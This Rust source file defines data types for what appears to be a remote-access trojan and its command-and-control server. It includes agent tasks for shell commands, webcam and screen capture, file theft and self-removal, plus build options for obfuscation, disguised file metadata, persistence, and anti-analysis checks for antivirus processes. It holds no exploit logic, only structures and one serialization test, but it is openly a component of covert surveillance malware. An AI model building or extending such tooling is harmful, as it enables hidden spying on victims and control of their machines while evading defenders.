use serde::{Deserialize, Serialize};

// ── Enums ──────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum AgentStatus {
    Online,
    Offline,
    Sleeping,
    Compromised,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum TaskStatus {
    Pending,
    Sent,
    Running,
    Completed,
    Failed,
    Cancelled,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum UserRole {
    Operator,
    Admin,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum CommandType {
    Shell,
    PowerShell,
    LocalAccounts,
    Upload,
    Download,
    Screenshot,
    Webcam,
    WifiScan,
    Kill,
    Sleep,
    Proxy,
    FileList,
    FileDrives,
    KillAndClean,
}

// ── Task ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AgentTask {
    pub id: String,
    #[serde(default)]
    pub agent_id: String,
    #[serde(default)]
    pub created_by: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    pub status: TaskStatus,
    #[serde(default)]
    pub output: Option<String>,
    #[serde(default)]
    pub error: Option<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

fn default_timeout() -> i32 {
    60
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskCreateRequest {
    #[serde(default)]
    pub agent_id: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

impl AgentTask {
    pub fn new(id: String, agent_id: String, command_type: CommandType, command: String) -> Self {
        Self {
            id,
            agent_id,
            created_by: String::new(),
            command_type,
            command,
            arguments: Vec::new(),
            status: TaskStatus::Pending,
            output: None,
            error: None,
            timeout_seconds: 60,
        }
    }
}

// ── Hardware Info ──────────────────────────────────────────────────────
//
// These serialize to camelCase so the C# server model (PascalCase, bound
// case-insensitively) receives RAM/Disk/CPU fields correctly. Without this,
// snake_case fields like `total_bytes` failed to bind and showed up empty.

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct HardwareInfo {
    #[serde(default)]
    pub hwid: Option<String>,
    pub cpu: Option<CpuInfo>,
    #[serde(default)]
    pub gpus: Vec<GpuInfo>,
    #[serde(default)]
    pub disks: Vec<DiskInfo>,
    pub ram: Option<RamInfo>,
    #[serde(default)]
    pub displays: Vec<DisplayInfo>,
    #[serde(default)]
    pub motherboard_vendor: Option<String>,
    #[serde(default)]
    pub bios_version: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CpuInfo {
    #[serde(default)]
    pub name: String,
    pub physical_cores: usize,
    pub logical_cores: usize,
    pub max_clock_mhz: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GpuInfo {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub driver_version: Option<String>,
    pub vram_bytes: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DiskInfo {
    #[serde(default)]
    pub model: String,
    pub size_bytes: u64,
    #[serde(default)]
    pub media_type: Option<String>,
    #[serde(default)]
    pub serial_number: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RamInfo {
    pub total_bytes: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DisplayInfo {
    #[serde(default)]
    pub name: String,
    pub width: u32,
    pub height: u32,
}

// ── Build Config ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BuildConfigRequest {
    #[serde(default = "default_platform")]
    pub platform: String,
    #[serde(default = "default_app_type")]
    pub application_type: String,
    #[serde(default = "default_host")]
    pub server_host: String,
    #[serde(default = "default_port")]
    pub server_port: u16,
    #[serde(default)]
    pub enable_obfuscation: bool,
    #[serde(default)]
    pub inject_junk_data: bool,
    #[serde(default = "default_junk_mb")]
    pub junk_data_mb: usize,
    #[serde(default)]
    pub icon_url: Option<String>,
    #[serde(default)]
    pub company_name: Option<String>,
    #[serde(default)]
    pub file_description: Option<String>,
    #[serde(default)]
    pub product_name: Option<String>,
    #[serde(default)]
    pub copyright: Option<String>,
    #[serde(default)]
    pub file_version: Option<String>,
    #[serde(default = "default_true")]
    pub trim_unused: bool,
    #[serde(default)]
    pub require_admin: bool,
    #[serde(default)]
    pub copy_to_app_data: bool,
    #[serde(default)]
    pub enable_persistence: bool,
    /// Language selector: "csharp" or "rust"
    #[serde(default = "default_lang")]
    pub language: String,
}

fn default_platform() -> String {
    "x64".into()
}
fn default_app_type() -> String {
    "Console".into()
}
fn default_host() -> String {
    "127.0.0.1".into()
}
fn default_port() -> u16 {
    5270
}
fn default_junk_mb() -> usize {
    10
}
fn default_true() -> bool {
    true
}
fn default_lang() -> String {
    "csharp".into()
}

// ── Config Injection (appended to binary at build time) ────────────────

/// Magic bytes that mark the start of the injected config block.
pub const CONFIG_MAGIC: &[u8; 16] = b"LIBRA_CFG_BLOCK!";

/// Anti-analysis detection configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AntiAnalysisConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default = "default_true")]
    pub check_test_signing: bool,
    #[serde(default = "default_true")]
    pub check_av_processes: bool,
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            check_test_signing: true,
            check_av_processes: true,
        }
    }
}

/// Config data injected into the binary at build time.
/// Accepts both camelCase (Rust) and snake_case (C#) field names.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct InjectedConfig {
    #[serde(alias = "server_url")]
    pub server_url: String,
    #[serde(alias = "register_path")]
    pub register_path: String,
    #[serde(alias = "heartbeat_path")]
    pub heartbeat_path: String,
    #[serde(alias = "result_path")]
    pub result_path: String,
    #[serde(alias = "ws_path")]
    pub ws_path: String,
    #[serde(alias = "heartbeat_interval_ms")]
    pub heartbeat_interval_ms: u64,
    #[serde(alias = "jitter_percent")]
    pub jitter_percent: f64,
    #[serde(alias = "require_admin")]
    pub require_admin: bool,
    #[serde(alias = "copy_to_path")]
    pub copy_to_path: Option<String>,
    #[serde(alias = "enable_persistence")]
    pub enable_persistence: bool,
    #[serde(default, alias = "core_download_path")]
    pub core_download_path: String,
    #[serde(default = "default_core_key_path", alias = "core_key_path")]
    pub core_key_path: String,
    #[serde(default, alias = "beacon_secret")]
    pub beacon_secret: String,
    #[serde(default, alias = "anti_analysis")]
    pub anti_analysis: AntiAnalysisConfig,
}

fn default_core_key_path() -> String {
    "/api/beacon/core-key".into()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hardware_serializes_camel_case() {
        let hw = HardwareInfo {
            hwid: Some("abc".into()),
            cpu: Some(CpuInfo {
                name: "Intel".into(),
                physical_cores: 8,
                logical_cores: 16,
                max_clock_mhz: 4000,
            }),
            gpus: vec![],
            disks: vec![DiskInfo {
                model: "SSD".into(),
                size_bytes: 512_000_000_000,
                media_type: None,
                serial_number: None,
            }],
            ram: Some(RamInfo { total_bytes: 16_000_000_000 }),
            displays: vec![],
            motherboard_vendor: None,
            bios_version: None,
        };

        let json = serde_json::to_string(&hw).unwrap();

        assert!(json.contains("\"totalBytes\""), "ram should serialize camelCase: {json}");
        assert!(json.contains("\"sizeBytes\""), "disk should serialize camelCase: {json}");
        assert!(json.contains("\"physicalCores\""), "cpu should serialize camelCase: {json}");
        assert!(!json.contains("\"total_bytes\""));
    }
}
